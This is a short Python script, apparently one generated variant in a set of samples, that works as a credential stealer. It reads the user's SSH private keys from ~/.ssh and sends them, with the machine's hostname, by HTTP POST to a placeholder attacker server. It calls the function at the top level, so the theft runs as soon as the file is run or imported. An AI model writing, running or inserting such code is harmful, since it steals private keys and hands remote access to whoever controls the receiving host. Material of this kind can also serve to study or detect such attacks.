# Variant 1 - Generated at 2026-03-30T08:16:36.489876
import os
import requests

def steal_credentials():
    """Steal credentials and send to C2"""
    creds = []
    # Read SSH keys
    for path in [os.path.expanduser("~/.ssh/id_rsa"), 
                 os.path.expanduser("~/.ssh/id_ed25519")]:
        if os.path.exists(path):
            with open(path) as f:
                creds.append(f.read())
    # Exfiltrate
    requests.post("https://attacker.example.com/exfil", 
                  json={"creds": creds, "hostname": os.uname().nodename})

steal_credentials()
